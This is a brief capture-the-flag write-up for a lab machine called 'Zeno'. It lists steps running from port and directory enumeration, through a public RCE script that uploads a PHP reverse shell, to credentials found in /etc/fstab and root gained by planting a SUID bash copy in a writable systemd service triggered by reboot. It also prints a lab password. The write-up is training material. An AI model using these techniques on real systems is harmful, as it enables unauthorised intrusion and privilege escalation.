# CTF Writeup: Zeno

---

- Step 1: added <target_ip> to /etc/hosts and ran multiple nmap scans --> 22 & 12340 (http) open
- Step 2: ran gobuster and retrieved /rms endpoint, login pages etc.
- Step 3: after 1 hour I started researching --> made searchsploit Restaurent Management System
--> found rce script
- Step 4: made cp <absolute_path> . --> gained script and fixxed it a bit
- Step 5: made python3 47520.py http://10.10.172.143:12340/rms/ --> revshell uploaded
- Step 6: pressed on url --> 10.10.172.143:12340/rms/images/reverse-shell.php
- Step 7: added ?cmd= parameter --> it works
- Step 8: made which bash to check if bash is installed --> adding bash rev shell now
- Step 9: made which python3 --> python3 on server --> decided to get python3 rev shell from jaytaylor
- Step 10: started listener and prompted shell into ?cmd= parameter and gained rce as apache user
- Step 11: made cat /etc/fstab to see accessible file systems --> /mnt --> creds zeno:FrobjoodAdkoonceanJa
- Step 12: made su edward --> prompted in pw --> logged in as edward and retriever user.txt flag
- Step 13: checked for writable suid's --> made find /etc -writable --> /etc/systemd/system/zeno-monitoring.service
- Step 14: made vim zeno-monitoring and added /bin/bash -c 'cp /bin/bash /mnt/secret-share/bash;chmod u+s /mnt/secret-share/bash'
--> under ExecStart
- Step 15: At the beginning I checked out sudo -l, which has a program running as root
--> /usr/sbin/reboot --> reboots the server --> which would trigger the ExecStart function in the zeno-monitoring service, which should create the bash file
- Step 16: made sudo /usr/sbin/reboot --> logged into ssh again after some time.
- Step 17: went to /mnt/secret-share and found bash suid binary --> went to gtfobins and typed in bash
- Step 18: made ./bash -p --> gained root rce --> retrieved root flag

---

## Key Learnings

- Further strengthened Privilege Escalation Knowledge
- Strengthened General Server CLI Knowledge /etc/fstab --> accessible filesystems
- Strengthened Enumeration Knowledge
- Strengthened Knowledge about mounted file system environments
